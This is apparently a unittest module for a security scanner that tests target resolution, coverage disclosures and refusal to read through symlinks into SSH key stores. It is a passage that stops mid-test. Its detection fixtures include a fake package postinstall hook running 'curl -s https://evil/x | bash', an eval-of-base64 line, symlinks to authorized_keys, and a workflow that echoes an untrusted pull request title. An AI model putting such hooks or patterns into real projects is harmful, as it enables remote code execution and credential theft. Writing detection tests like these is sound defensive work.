#!/usr/bin/env python3
"""A path names what to scan, whether or not anybody put it under git (#1535)."""
from __future__ import annotations

import io
import os
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path

from stayawake.bots.security import resolution
from stayawake.bots.security.resolution import resolve_local_targets
from stayawake.bots.security.service import workers
from stayawake.bots.security.signatures import load_signatures
from stayawake.bots.security.targets import ScanOptions


def _report_of(target: Path) -> str:
    """The terminal report a scan of `target` prints."""
    from stayawake.bots.security import service
    cfgd = Path(tempfile.mkdtemp())
    (cfgd / "c.yml").write_text("allowlist: []\n", encoding="utf-8")
    out = io.StringIO()
    with redirect_stdout(out), redirect_stderr(io.StringIO()):
        service.scan(str(cfgd / "c.yml"), paths=[str(target)], no_stream=True)
    return out.getvalue()


def _stderr_of(target: Path) -> str:
    """What a scan of `target` writes to stderr."""
    from stayawake.bots.security import service
    cfgd = Path(tempfile.mkdtemp())
    (cfgd / "c.yml").write_text("allowlist: []\n", encoding="utf-8")
    err = io.StringIO()
    with redirect_stdout(io.StringIO()), redirect_stderr(err):
        service.scan(str(cfgd / "c.yml"), paths=[str(target)], no_stream=True)
    return err.getvalue()


def _signatures_reported(target: Path, about: str) -> set[str]:
    """The signature ids a scan of `target` reports about a path containing `about`."""
    from stayawake.bots.security import service
    cfgd = Path(tempfile.mkdtemp())
    (cfgd / "c.yml").write_text("allowlist: []\n", encoding="utf-8")
    out = io.StringIO()
    with redirect_stdout(out), redirect_stderr(io.StringIO()):
        service.scan(str(cfgd / "c.yml"), paths=[str(target)], no_stream=True)
    return {line.split("]")[1].split()[0]
            for line in out.getvalue().splitlines()
            if "  • [" in line and about in line}


class TestWhatAPathResolvesTo(unittest.TestCase):
    def setUp(self):
        self.d = Path(tempfile.mkdtemp())
        (self.d / "a.js").write_text("export const ok = 1;\n", encoding="utf-8")

    def _one(self, pattern):
        found = resolve_local_targets([str(pattern)], ScanOptions())
        self.assertEqual(len(found), 1, f"{pattern} resolved to {found}")
        return found[0]

    def test_a_directory_nobody_put_under_git_is_scanned_as_itself(self):
        t = self._one(self.d)
        self.assertEqual(t.root, self.d.resolve())
        self.assertIsNone(t.include_only)
        self.assertFalse(t.is_repo)

    def test_a_single_file_is_scanned_as_that_file(self):
        t = self._one(self.d / "a.js")
        self.assertEqual(t.root, self.d.resolve())
        self.assertEqual(t.include_only, ("a.js",))
        self.assertFalse(t.is_repo)

    def test_a_repository_is_still_a_repository(self):
        (self.d / ".git").mkdir()
        t = self._one(self.d)
        self.assertTrue(t.is_repo)
        self.assertIsNone(t.include_only)

    def test_a_scope_cannot_be_built_with_a_kind_nobody_defined(self):
        # A scope built positionally used to accept `True` in this slot and degrade to "not a
        # repository" — dropping a matcher, in silence.
        with self.assertRaises(ValueError):
            resolution.LocalTarget(self.d, None, True)

    def test_a_directory_inside_a_repository_is_read_from_the_repository_root(self):
        import subprocess
        subprocess.run(["git", "init", "-q", str(self.d)], check=True)
        (self.d / "src").mkdir()
        t = self._one(self.d / "src")
        self.assertEqual(t.root, self.d.resolve())
        self.assertEqual(t.within, "src")
        self.assertEqual(t.scan_root, self.d.resolve() / "src")
        self.assertFalse(t.is_repo)

    def test_a_path_that_names_nothing_resolves_to_nothing(self):
        self.assertEqual(resolve_local_targets([str(self.d / "absent")], ScanOptions()), [])

    def test_a_typo_inside_a_repository_is_not_answered_by_that_repository(self):
        # Discovery promotes a path that is not there to its parent, so `<repo>/typo` came back as
        # the whole of `<repo>` — reported under the repository's name, and a clean verdict there
        # reads as "the path I named is clean". This fixture needs the `.git`: without one the
        # promotion finds nothing and the test passes while the hole is open.
        import subprocess
        subprocess.run(["git", "init", "-q", str(self.d)], check=True)
        self.assertEqual(resolve_local_targets([str(self.d / "typo")], ScanOptions()), [])

    def test_a_typo_above_a_fleet_is_not_answered_by_the_fleet(self):
        import subprocess
        for name in ("one", "two"):
            subprocess.run(["git", "init", "-q", str(self.d / name)], check=True)
        self.assertEqual(resolve_local_targets([str(self.d / "typo")], ScanOptions()), [])

    def test_a_glob_still_resolves_to_what_it_matches(self):
        # The guard above must not eat a pattern, which never exists as written.
        import subprocess
        for name in ("one", "two"):
            subprocess.run(["git", "init", "-q", str(self.d / name)], check=True)
        found = resolve_local_targets([str(self.d) + "/*"], ScanOptions())
        self.assertEqual({t.root.name for t in found}, {"one", "two"})

    def test_two_paths_that_differ_only_by_a_pipe_are_two_targets(self):
        # `key` was a `|`-joined string, so a directory named `a||` collided with a different path
        # and the second was dropped before any scan — no error, no note. The repository matters:
        # it is what puts `a||` in `within`, which is the field the split moves across.
        import subprocess
        subprocess.run(["git", "init", "-q", str(self.d / "x")], check=True)
        (self.d / "x" / "a||").mkdir(parents=True)
        (self.d / "x||a").mkdir(parents=True)
        found = resolve_local_targets([str(self.d / "x" / "a||"), str(self.d / "x||a")],
                                      ScanOptions())
        self.assertEqual(len(found), 2, f"a target was dropped: {[str(t.label) for t in found]}")

    def test_a_sweep_still_finds_the_repositories_under_it(self):
        (self.d / "one").mkdir()
        (self.d / "one" / ".git").mkdir()
        (self.d / "two").mkdir()
        (self.d / "two" / ".git").mkdir()
        found = resolve_local_targets([str(self.d)], ScanOptions())
        self.assertEqual({t.root.name for t in found}, {"one", "two"})
        self.assertTrue(all(t.is_repo for t in found))


class TestWhatANonRepositoryScanSays(unittest.TestCase):
    def setUp(self):
        self.d = Path(tempfile.mkdtemp())
        (self.d / "a.js").write_text("export const ok = 1;\n", encoding="utf-8")

    def _scan(self, *, is_repo, include_only=None, names_one_file=False):
        # Built through the real scope, so the job cannot be given a shape the resolver never
        # produces — the disclosure is derived from it, not passed in beside it.
        kind = (resolution.ONE_FILE if names_one_file
                else resolution.REPOSITORY if is_repo else resolution.DIRECTORY)
        scope = resolution.LocalTarget(Path(self.d), include_only, kind)
        return workers.scan_local(
            workers.LocalScanJob(scope, "t", ScanOptions(), load_signatures(), [])).result

    def test_it_says_the_history_checks_did_not_run(self):
        notes = " ".join(self._scan(is_repo=False).notes)
        self.assertIn("not a repository", notes)
        self.assertIn("history", notes)

    def test_a_repository_scan_does_not_say_that(self):
        self.assertNotIn("not a repository", " ".join(self._scan(is_repo=True).notes))

    def test_only_the_named_file_is_read(self):
        # The siblings below are ones WHOLE-TARGET matchers reach — a link, a dependency tree, a
        # per-file payload. The earlier version of this test planted only the last, which a
        # partitionable matcher scopes on its own, so it could not fail.
        (self.d / "other.js").write_text("const x = eval(atob('Zm9v'));\n", encoding="utf-8")
        (self.d / "payload.js").write_text("var _$_ab12 = 1;\n", encoding="utf-8")
        os.symlink("/Users/ndevu/.ssh/authorized_keys", self.d / "redirect-link")
        (self.d / "node_modules" / "evilpkg").mkdir(parents=True)
        (self.d / "node_modules" / "evilpkg" / "package.json").write_text(
            '{"name":"evilpkg","version":"1.0.0",'
            '"scripts":{"postinstall":"curl -s https://evil/x | bash"}}', encoding="utf-8")
        result = self._scan(is_repo=False, include_only=("a.js",), names_one_file=True)
        named_elsewhere = [f for f in result.findings
                           if not f.path.endswith("a.js")]
        self.assertEqual(named_elsewhere, [],
                         f"a sibling reached the verdict: {[f.path for f in named_elsewhere]}")


class TestWhatARefusalSays(unittest.TestCase):
    """A target that carries no verdict is named, with the reason — never refused in silence."""

    def _run(self, target: Path):
        cfgd = Path(tempfile.mkdtemp())
        (cfgd / "c.yml").write_text("allowlist: []\n", encoding="utf-8")
        err = io.StringIO()
        with redirect_stdout(io.StringIO()), redirect_stderr(err):
            from stayawake.bots.security import service
            rc = service.scan(str(cfgd / "c.yml"), paths=[str(target)], no_stream=True)
        return rc, err.getvalue()

    def test_it_names_the_target_and_why(self):
        empty = Path(tempfile.mkdtemp())
        rc, err = self._run(empty)
        self.assertEqual(rc, 2)
        self.assertIn(str(empty), err)
        self.assertIn("could be read", err)

    def test_it_does_not_claim_history_checks_were_skipped_when_nothing_was_read(self):
        _rc, err = self._run(Path(tempfile.mkdtemp()))
        self.assertNotIn("not a repository", err)


class TestABareRunAimsAtRepositories(unittest.TestCase):
    """`saw scan` with no path is about the repository being stood in — not the folder."""

    def _bare(self, setup):
        import subprocess
        from stayawake.bots.security import service
        here = os.getcwd()          # BEFORE setup: a setup that chdirs would otherwise make this
        self.addCleanup(os.chdir, here)   # restore a temp dir that is about to be deleted
        d = Path(tempfile.mkdtemp())
        setup(d, subprocess)
        cfgd = Path(tempfile.mkdtemp())
        (cfgd / "c.yml").write_text("allowlist: []\n", encoding="utf-8")
        os.chdir(d)
        try:
            err = io.StringIO()
            with redirect_stdout(io.StringIO()), redirect_stderr(err):
                rc = service.scan(str(cfgd / "c.yml"), no_stream=True)
            return rc, err.getvalue()
        finally:
            os.chdir(here)

    def test_it_still_finds_the_repository_it_is_standing_in(self):
        def setup(d, sp):
            sp.run(["git", "init", "-q", str(d)], check=True)
            (d / "a.js").write_text("export const ok = 1;\n", encoding="utf-8")
        rc, err = self._bare(setup)
        self.assertEqual(rc, 0)
        self.assertIn("scanning current repository", err)

    def test_it_finds_the_repository_from_a_subdirectory(self):
        def setup(d, sp):
            sp.run(["git", "init", "-q", str(d)], check=True)
            (d / "sub").mkdir()
            (d / "sub" / "a.js").write_text("export const ok = 1;\n", encoding="utf-8")
        rc, err = self._bare(lambda d, sp: (setup(d, sp), os.chdir(d / "sub"))[0])
        self.assertEqual(rc, 0)
        self.assertIn("scanning current repository", err)

    def test_outside_a_repository_it_says_so_rather_than_scanning_the_folder(self):
        rc, err = self._bare(lambda d, sp: (d / "a.js").write_text("x\n", encoding="utf-8"))
        self.assertEqual(rc, 2)
        self.assertIn("not a repository", err)
        self.assertIn("saw scan <path>", err)


class TestNamingAFileLosesNoDetection(unittest.TestCase):
    """Scanning a file finds what scanning its directory finds ABOUT THAT FILE, for every check
    that judges a file. What a PROJECT-level check would have said is a known loss, pinned as such
    in TestTheKnownLossIsDisclosed below — not covered here, so this class cannot imply it.

    The comparison is the point: an earlier version of this module tested the file scan alone, so
    every detection the re-rooting silently dropped still passed.
    """

    def _case(self, build) -> tuple[set[str], set[str]]:
        d = Path(tempfile.mkdtemp())
        rel = build(d)
        return _signatures_reported(d, rel), _signatures_reported(d / rel, rel)

    def _assert_no_loss(self, build, what: str):
        by_dir, by_file = self._case(build)
        self.assertTrue(by_dir, f"the fixture for {what} is not detected at all — it proves nothing")
        self.assertEqual(by_dir - by_file, set(),
                         f"naming the {what} lost: {sorted(by_dir - by_file)}")

    def test_a_manifest_named_directly(self):
        def build(d):
            (d / "package.json").write_text(
                '{"name":"x","version":"1.0.0","dependencies":{"fetch-page-assets":"1.2.9"}}',
                encoding="utf-8")
            return "package.json"
        self._assert_no_loss(build, "manifest")

    def test_a_source_payload_named_directly(self):
        def build(d):
            (d / "loader.js").write_text("var _$_ab12 = 1;\n", encoding="utf-8")
            return "loader.js"
        self._assert_no_loss(build, "source file")

    def test_a_write_redirect_link_named_directly(self):
        def build(d):
            os.symlink("/Users/ndevu/.ssh/authorized_keys", d / "redirect")
            return "redirect"
        self._assert_no_loss(build, "symlink")

    def test_a_workflow_named_directly_keeps_its_path(self):
        # The one that catches re-rooting: this matcher requires `.github/workflows/` in the path,
        # so a target rooted at the file's own parent flattens it away and detects nothing.
        def build(d):
            import subprocess
            subprocess.run(["git", "init", "-q", str(d)], check=True)
            wf = d / ".github" / "workflows"
            wf.mkdir(parents=True)
            (wf / "pr.yml").write_text(
                "on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n"
                '      - run: echo "${{ github.event.pull_request.title }}"\n', encoding="utf-8")
            return ".github/workflows/pr.yml"
        self._assert_no_loss(build, "workflow")


class TestWhatTheVerdictIsAbout(unittest.TestCase):
    """A file's verdict is reported under the file's name — never its repository's."""

    def setUp(self):
        import subprocess
        self.repo = Path(tempfile.mkdtemp())
        subprocess.run(["git", "init", "-q", str(self.repo)], check=True)
        (self.repo / "src").mkdir()
        (self.repo / "src" / "clean.js").write_text("export const ok = 1;\n", encoding="utf-8")
        (self.repo / "src" / "bad.js").write_text("var _$_ab12 = 1;\n", encoding="utf-8")
        self.cfg = Path(tempfile.mkdtemp()) / "c.yml"
        self.cfg.write_text("allowlist: []\n", encoding="utf-8")

    def _report(self, target: Path) -> str:
        from stayawake.bots.security import service
        out = io.StringIO()
        with redirect_stdout(out), redirect_stderr(io.StringIO()):
            service.scan(str(self.cfg), paths=[str(target)], no_stream=True)
        return out.getvalue()

    def test_a_clean_file_does_not_declare_its_repository_clean(self):
        # `--alert` opens and closes an issue titled with this name: labelling one file's clean
        # result with its repository closes that repository's open security issue.
        report = self._report(self.repo / "src" / "clean.js")
        self.assertIn("src/clean.js", report)
        lines = [l for l in report.splitlines() if "clean" in l and str(self.repo) in l]
        self.assertTrue(lines, "no verdict row names the file")
        for line in lines:
            self.assertIn("clean.js", line, f"a verdict row names something else: {line.strip()}")

    def test_it_says_the_project_level_checks_did_not_run(self):
        report = self._report(self.repo / "src" / "clean.js")
        self.assertIn("Only the file you named was read", report)


class TestTheKnownLossIsDisclosed(unittest.TestCase):
    """Naming a file DOES lose the project-level checks. That loss is pinned here so it stays a
    deliberate, disclosed decision instead of drifting into a silent gap."""

    def setUp(self):
        self.d = Path(tempfile.mkdtemp())
        (self.d / "package-lock.json").write_text(
            '{"lockfileVersion": 3, "packages": {"": {"name": "app"}}}', encoding="utf-8")
        pkg = self.d / "node_modules" / "ghosty"
        pkg.mkdir(parents=True)
        (pkg / "package.json").write_text('{"name":"ghosty","version":"1.0.0"}', encoding="utf-8")
        self.rel = "node_modules/ghosty/package.json"
        self.cfg = Path(tempfile.mkdtemp()) / "c.yml"
        self.cfg.write_text("allowlist: []\n", encoding="utf-8")

    def _report(self, target: Path) -> str:
        from stayawake.bots.security import service
        out = io.StringIO()
        with redirect_stdout(out), redirect_stderr(io.StringIO()):
            service.scan(str(self.cfg), paths=[str(target)], no_stream=True)
        return out.getvalue()

    def test_the_directory_scan_reports_it(self):
        # If this stops holding the fixture is dead and the test below proves nothing.
        self.assertIn("ghost-package", self._report(self.d))

    def test_naming_the_file_does_not_and_says_so(self):
        report = self._report(self.d / self.rel)
        self.assertNotIn("ghost-package", report)
        # Asserted against the note itself: "installed package" appears elsewhere in the report, so
        # searching the whole of it passed even with the note's wording gutted.
        note = self._one_file_note(report)
        self.assertIn("installed package", note)
        self.assertIn("history", note)

    @staticmethod
    def _one_file_note(report: str) -> str:
        lines = report.splitlines()
        for i, line in enumerate(lines):
            if "Only the file you named was read" in line:
                tail = []
                for nxt in lines[i:]:
                    if nxt.strip() and not nxt.startswith(("  •", "     ", "   ")) and tail:
                        break
                    tail.append(nxt)
                return " ".join(tail)
        return ""


class TestNamingADirectoryLosesNoDetection(unittest.TestCase):
    """Scanning a directory finds what scanning the repository around it finds ABOUT THAT
    DIRECTORY. The same oracle as naming a file, for the shape that got the fix second: a
    directory rooted at itself flattens every path-anchored signature away.
    """

    def _repo_with_a_workflow(self) -> Path:
        import subprocess
        d = Path(tempfile.mkdtemp())
        subprocess.run(["git", "init", "-q", str(d)], check=True)
        wf = d / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yml").write_text(
            "jobs:\n  b:\n    runs-on: [self-hosted, SHA1HULUD]\n    steps: []\n",
            encoding="utf-8")
        return d

    def test_a_directory_between_the_repository_and_the_file_keeps_the_path(self):
        d = self._repo_with_a_workflow()
        by_repo = _signatures_reported(d, "ci.yml")
        self.assertTrue(by_repo, "the fixture is not detected at all — it proves nothing")
        for named in (d / ".github", d / ".github" / "workflows"):
            lost = by_repo - _signatures_reported(named, "ci.yml")
            self.assertEqual(lost, set(), f"naming {named.name} lost: {sorted(lost)}")

    def test_the_reported_path_is_the_one_the_repository_would_report(self):
        d = self._repo_with_a_workflow()
        report = _report_of(d / ".github")
        self.assertIn(".github/workflows/ci.yml", report)

    def test_a_named_directory_does_not_answer_for_its_siblings(self):
        import subprocess
        d = Path(tempfile.mkdtemp())
        subprocess.run(["git", "init", "-q", str(d)], check=True)
        (d / "src").mkdir()
        (d / "src" / "ok.js").write_text("export const ok = 1;\n", encoding="utf-8")
        (d / "other").mkdir()
        (d / "other" / "bad.js").write_text("var _$_ab12 = 1;\n", encoding="utf-8")
        self.assertTrue(_signatures_reported(d, "bad.js"), "the sibling payload is not detected")
        self.assertEqual(_signatures_reported(d / "src", "bad.js"), set(),
                         "a sibling outside the named directory reached its verdict")

    def test_it_says_which_project_level_checks_did_not_run(self):
        d = self._repo_with_a_workflow()
        report = _report_of(d / ".github")
        self.assertIn("Only the directory you named was read", report)
        self.assertNotIn("not a repository", report)   # it IS in one — the premise has to be true


class TestALinkIsAlwaysAnEntry(unittest.TestCase):
    """A symlink is a thing a redirect check must judge, whatever lives under it. Discovery walks
    THROUGH the link, so a git-managed target (a Doom/LazyVim config is one) used to make the
    resolver answer about the repository it found and never mention the link at all.

    The sink sits outside the link's own directory because only an ESCAPING link is a redirect.
    """

    def setUp(self):
        import subprocess
        self.subprocess = subprocess
        self.base = Path(tempfile.mkdtemp())
        self.proj = self.base / "proj"
        self.proj.mkdir()
        self.sink = self.base / "home" / ".emacs.d"       # a write-sink the detector knows
        self.sink.mkdir(parents=True)
        self.elsewhere = self.base / "home" / "projects" / "app"   # an ordinary destination
        self.elsewhere.mkdir(parents=True)
        self.link = self.proj / "dist"

    def _resolve(self, destination):
        os.symlink(str(destination), str(self.link))
        return resolve_local_targets([str(self.link)], ScanOptions())

    def test_a_link_onto_a_repository_reports_the_link_and_the_repository(self):
        self.subprocess.run(["git", "init", "-q", str(self.elsewhere)], check=True)
        found = self._resolve(self.elsewhere)
        self.assertEqual([t.kind for t in found], [resolution.ONE_FILE, resolution.REPOSITORY])
        self.assertEqual(found[0].label.name, "dist")
        self.assertEqual(found[0].label.parent, Path(os.path.realpath(self.proj)))

    def test_a_link_onto_a_tree_of_repositories_still_reports_the_link(self):
        self.subprocess.run(["git", "init", "-q", str(self.elsewhere / "cfg")], check=True)
        kinds = [t.kind for t in self._resolve(self.elsewhere)]
        self.assertEqual(kinds[0], resolution.ONE_FILE, f"the link entry was dropped: {kinds}")

    def test_the_write_redirect_survives_a_repository_under_the_link(self):
        # The end-to-end loss: `dist -> a git-managed ~/.emacs.d` scanned CLEAN, because the
        # repository found through the link replaced the link as the thing being answered about.
        self.subprocess.run(["git", "init", "-q", str(self.sink)], check=True)
        os.symlink(str(self.sink), str(self.link))
        self.assertIn("symlink-write-redirect", _signatures_reported(self.link, "dist"))

    def test_the_same_link_without_the_repository_is_reported_the_same_way(self):
        # The control: without the `.git` this always worked, so a difference between the two is
        # the defect and not the fixture.
        os.symlink(str(self.sink), str(self.link))
        self.assertIn("symlink-write-redirect", _signatures_reported(self.link, "dist"))


class TestALinkIntoACredentialStoreIsNotFollowed(unittest.TestCase):
    """Resolving a link is the tool's decision, not the operator's. Reading through one that lands
    in a credential store puts those paths in the report, the SARIF and an `--alert` issue body —
    so the link is judged and what is behind it is left alone, and said so."""

    def setUp(self):
        self.base = Path(tempfile.mkdtemp())
        self.proj = self.base / "proj"
        self.proj.mkdir()
        self.keys = self.base / "home" / ".ssh"
        self.keys.mkdir(parents=True)
        (self.keys / "id_ed25519").write_text("PRIVATE KEY\n", encoding="utf-8")
        self.link = self.proj / "dist"
        os.symlink(str(self.keys), str(self.link))

    def test_what_is_behind_it_is_not_read(self):
        found = resolve_local_targets([str(self.link)], ScanOptions())
        self.assertEqual([t.kind for t in found], [resolution.ONE_FILE])
        self.assertTrue(found[0].unread_destination)

    def test_nothing_from_behind_it_reaches_the_report(self):
        # The link's own destination IS the finding's evidence — that is the detection. What must
        # never appear is what enumerating the store would have produced.
        self.assertNotIn("id_ed25519", _report_of(self.link))

    def test_it_says_so_rather_than_skipping_in_silence(self):
        self.assertIn("was not read through", _report_of(self.link))

    def test_the_link_itself_is_still_judged(self):
        self.assertIn("symlink-write-redirect", _signatures_reported(self.link, "dist"))

    def test_the_destination_file_is_never_opened(self):
        # Measured on the file's atime, because every other assertion passed while the bytes were
        # being read: suppressing the resolved DIRECTORY left the link entry itself reading through.
        key = self.keys / "id_ed25519"
        link = self.proj / "creds"
        os.symlink(str(key), str(link))
        before = key.stat().st_atime_ns
        _report_of(link)
        self.assertEqual(key.stat().st_atime_ns, before, "the destination was opened")

    def test_an_ordinary_destination_is_still_read_through(self):
        other = self.base / "work"
        other.mkdir()
        (other / "bad.js").write_text("var _$_ab12 = 1;\n", encoding="utf-8")
        link = self.proj / "current"
        os.symlink(str(other), str(link))
        self.assertTrue(_signatures_reported(link, "bad.js"),
                        "a benign link stopped being read through")


class TestWherePathsAreMeasuredFrom(unittest.TestCase):
    """Outside a repository there is no project root, so a file's path is whatever the named path
    makes it — and a signature anchored on where a file sits stops matching when you narrow. Saw
    cannot recover the path, so it says so instead of letting the loss be silent."""

    def _plain_tree_with_a_workflow(self) -> Path:
        d = Path(tempfile.mkdtemp())                  # deliberately NOT a repository
        wf = d / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yml").write_text(
            "jobs:\n  b:\n    runs-on: [self-hosted, SHA1HULUD]\n    steps: []\n",
            encoding="utf-8")
        return d

    def test_the_loss_is_disclosed_when_there_is_no_project_to_measure_from(self):
        d = self._plain_tree_with_a_workflow()
        self.assertIn("measured from the path you named", _report_of(d / ".github" / "workflows"))

    def test_a_repository_scan_does_not_carry_that_note(self):
        import subprocess
        d = self._plain_tree_with_a_workflow()
        subprocess.run(["git", "init", "-q", str(d)], check=True)
        for named in (d, d / ".github" / "workflows", d / ".github" / "workflows" / "ci.yml"):
            self.assertNotIn("measured from the path you named", _report_of(named))

    def test_a_file_named_inside_a_repository_does_not_carry_it_either(self):
        import subprocess
        d = self._plain_tree_with_a_workflow()
        subprocess.run(["git", "init", "-q", str(d)], check=True)
        scope = resolve_local_targets([str(d / ".github" / "workflows" / "ci.yml")],
                                      ScanOptions())[0]
        self.assertTrue(scope.paths_are_project_relative)
        self.assertIsNone(scope.where_paths_are_from())


class TestATargetThatCarriesAVerdictIsNotAlsoRefused(unittest.TestCase):
    """`iter_files` never lists a symlink-to-a-directory, but the symlink matcher judges one — so a
    target reported a finding AND an error saying it carried no verdict."""

    def test_a_finding_and_a_refusal_are_not_reported_together(self):
        r = Path(tempfile.mkdtemp())
        pkg = r / "pkg"
        pkg.mkdir()
        away = Path(tempfile.mkdtemp()) / "elsewhere"
        away.mkdir(parents=True)
        os.symlink(str(away), str(pkg / "vend"))
        # stderr too: the terminal sink hides the error behind an INFECTED panel, so a
        # stdout-only assertion passed while the contradiction was still being emitted.
        everything = _report_of(pkg) + _stderr_of(pkg)
        self.assertIn("symlink-escapes-repo", everything)
        self.assertNotIn("carries no verdict", everything)

    def test_a_target_that_really_read_nothing_still_fails_closed(self):
        empty = Path(tempfile.mkdtemp())
        self.assertIn("could be read", _report_of(empty) + _stderr_of(empty))


class TestWhatTheWalkSkippedByName(unittest.TestCase):
    """Naming `dist` scans it — and says which of its children the standard exclusions dropped,
    instead of reporting a hollow clean."""

    def test_an_excluded_child_of_a_named_directory_is_disclosed(self):
        d = Path(tempfile.mkdtemp())
        (d / "dist" / "node_modules").mkdir(parents=True)
        (d / "dist" / "keep.js").write_text("export const ok = 1;\n", encoding="utf-8")
        (d / "dist" / "node_modules" / "x.js").write_text("var _$_ab12 = 1;\n", encoding="utf-8")
        report = _report_of(d / "dist")
        self.assertIn("node_modules", report)
        self.assertIn("were not walked", report)

    def test_a_repository_scan_does_not_carry_that_note(self):
        import subprocess
        d = Path(tempfile.mkdtemp())
        subprocess.run(["git", "init", "-q", str(d)], check=True)
        (d / "node_modules").mkdir()
        (d / "a.js").write_text("export const ok = 1;\n", encoding="utf-8")
        self.assertNotIn("were not walked", _report_of(d))


class TestAWriteSinkIsNeverReadThrough(unittest.TestCase):
    """A link into a credential store is graded, never opened — wherever the walk reaches it, not
    only when the operator named the link itself. Measured on the destination's atime, because the
    report said "not read through" for an hour while the bytes were being read."""

    def setUp(self):
        self.base = Path(tempfile.mkdtemp())
        self.proj = self.base / "proj"
        self.proj.mkdir()
        keys = self.base / "home" / ".ssh"
        keys.mkdir(parents=True)
        self.key = keys / "id_rsa"
        self.key.write_text("ssh-rsa AAAATOPSECRETKEYMATERIAL\nvar _$_dead = 1;\n",
                            encoding="utf-8")
        os.symlink(str(self.key), str(self.proj / "keys.js"))

    def test_naming_the_directory_does_not_open_the_destination(self):
        before = self.key.stat().st_atime_ns
        _report_of(self.proj)
        self.assertEqual(self.key.stat().st_atime_ns, before, "the destination was opened")

    def test_no_bytes_from_the_destination_reach_the_report(self):
        report = _report_of(self.proj)
        self.assertNotIn("TOPSECRET", report)
        self.assertNotIn("KEYMATERIAL", report)

    def test_the_link_is_still_graded(self):
        self.assertIn("symlink-write-redirect", _signatures_reported(self.proj, "keys.js"))

    def test_the_skipped_read_is_disclosed(self):
        self.assertIn("its destination was not read", _report_of(self.proj))

    def test_an_oversized_destination_is_not_read_either(self):
        # `read_text` sends a large SOURCE file straight to the head+tail reader, which never
        # touches `read_bytes` — so guarding one opener left the other open.
        big = self.base / "home" / ".ssh" / "id_big"
        big.write_text("ssh-rsa AAAATOPSECRETKEYMATERIAL\n" + ("x" * 3_000_000) + "\nTAILSECRET\n",
                       encoding="utf-8")
        os.symlink(str(big), str(self.proj / "big.js"))
        report = _report_of(self.proj)
        self.assertNotIn("TOPSECRET", report)
        self.assertNotIn("TAILSECRET", report)

    def test_the_interior_of_a_large_destination_is_not_read_either(self):
        # A third opener: a source file between 2MB and 64MB is read in overlapping windows, which
        # is the only path that reaches the MIDDLE of a file. The needle sits at 1.5MB so it can
        # come from nowhere else.
        big = self.base / "home" / ".ssh" / "id_rsa_big.js"
        big.write_text("x" * 1_500_000 + '\nconst _$_ab12 = "KEYNEEDLE";\n' + "y" * 1_600_000,
                       encoding="utf-8")
        os.symlink(str(big), str(self.proj / "windowed.js"))
        # Asserted on what was FOUND, not on the secret's text: the evidence preview is truncated,
        # so a test looking for the whole needle passed while the bytes were being read.
        found = _signatures_reported(self.proj, "windowed.js")
        self.assertEqual(found, {"symlink-write-redirect"},
                         f"the destination's interior was read: {sorted(found)}")

    def test_an_ordinary_link_inside_the_tree_is_still_read(self):
        other = self.base / "shared"
        other.mkdir()
        payload = other / "lib.js"
        payload.write_text("var _$_ab12 = 1;\n", encoding="utf-8")
        os.symlink(str(payload), str(self.proj / "aliased.js"))
        self.assertTrue(_signatures_reported(self.proj, "aliased.js"),
                        "an ordinary aliased file stopped being read")


class TestAPatternThatMatchesNothingNamesNothing(unittest.TestCase):
    """Discovery walks from a pattern's literal prefix and falls back to the PARENT when that
    prefix is absent, so a stale glob was answered by whatever sat beside it — and exited 0."""

    def setUp(self):
        import subprocess
        self.d = Path(tempfile.mkdtemp())
        for name in ("svc-a", "other"):
            subprocess.run(["git", "init", "-q", str(self.d / name)], check=True)
        (self.d / "other" / "bad.js").write_text("var _$_ab12 = 1;\n", encoding="utf-8")

    def _names(self, pattern):
        return sorted(t.label.name for t in resolve_local_targets([pattern], ScanOptions()))

    def test_a_stale_glob_resolves_to_nothing(self):
        self.assertEqual(self._names(str(self.d / "svc-renamed*")), [])

    def test_a_glob_that_matches_still_discovers(self):
        self.assertEqual(self._names(str(self.d / "*")), ["other", "svc-a"])

    def test_a_hidden_repository_is_still_discovered(self):
        # The walk is what finds it; a `*` alone would not match a leading dot.
        import subprocess
        subprocess.run(["git", "init", "-q", str(self.d / ".hidden")], check=True)
        self.assertIn(".hidden", self._names(str(self.d / "*")))

    def test_a_real_file_whose_name_holds_a_star_is_that_file(self):
        named = self.d / "star*name.js"
        named.write_text("var _$_ab12 = 1;\n", encoding="utf-8")
        self.assertEqual(self._names(str(named)), ["star*name.js"])


class TestATargetThatReadNothingSaysWhy(unittest.TestCase):
    """The disclosure was attached only where something was read, so the target that skipped
    EVERYTHING was the one that explained nothing."""

    def test_a_directory_whose_whole_content_was_pruned_explains_itself(self):
        d = Path(tempfile.mkdtemp())
        (d / "dist").mkdir()
        (d / "dist" / "bundle.js").write_text("var _$_ab12 = 1;\n", encoding="utf-8")
        report = _report_of(d) + _stderr_of(d)
        self.assertIn("carries no verdict", report)
        self.assertIn("were not walked", report)

    def test_a_directory_of_only_pipes_does_not_read_clean(self):
        # A FIFO `exists()`, so the emptiness test counted it as content and nothing was opened.
        d = Path(tempfile.mkdtemp())
        os.mkfifo(d / "app.js")
        self.assertIn("carries no verdict", _report_of(d) + _stderr_of(d))


class TestEachTargetOwnsItsCoverageNotes(unittest.TestCase):
    """With more than one target the notes were flattened into one deduped block, so a note about
    one named path lost the only thing that made it readable — which path."""

    def _two_repos_and_a_folder(self):
        import subprocess
        base = Path(tempfile.mkdtemp())
        keys = base / "vhome" / ".ssh"
        keys.mkdir(parents=True)
        (keys / "id_rsa").write_text("k\n", encoding="utf-8")
        targets = []
        for name in ("repoA", "repoB"):
            r = base / name
            subprocess.run(["git", "init", "-q", str(r)], check=True)
            (r / "a.js").write_text("export const ok = 1;\n", encoding="utf-8")
            os.symlink(str(keys / "id_rsa"), str(r / "secrets.js"))
            targets.append(r)
        loose = base / "loose"
        loose.mkdir()
        (loose / "b.js").write_text("export const ok = 2;\n", encoding="utf-8")
        targets.append(loose)
        return targets

    def _notes(self, targets):
        from stayawake.bots.security import service
        cfgd = Path(tempfile.mkdtemp())
        (cfgd / "c.yml").write_text("allowlist: []\n", encoding="utf-8")
        out = io.StringIO()
        with redirect_stdout(out), redirect_stderr(io.StringIO()):
            service.scan(str(cfgd / "c.yml"), paths=[str(t) for t in targets], no_stream=True)
        return [l.strip() for l in out.getvalue().splitlines() if l.strip().startswith("•")
                and "·" not in l]

    def test_a_note_two_targets_owe_is_shown_for_each_of_them(self):
        targets = self._two_repos_and_a_folder()
        notes = self._notes(targets)
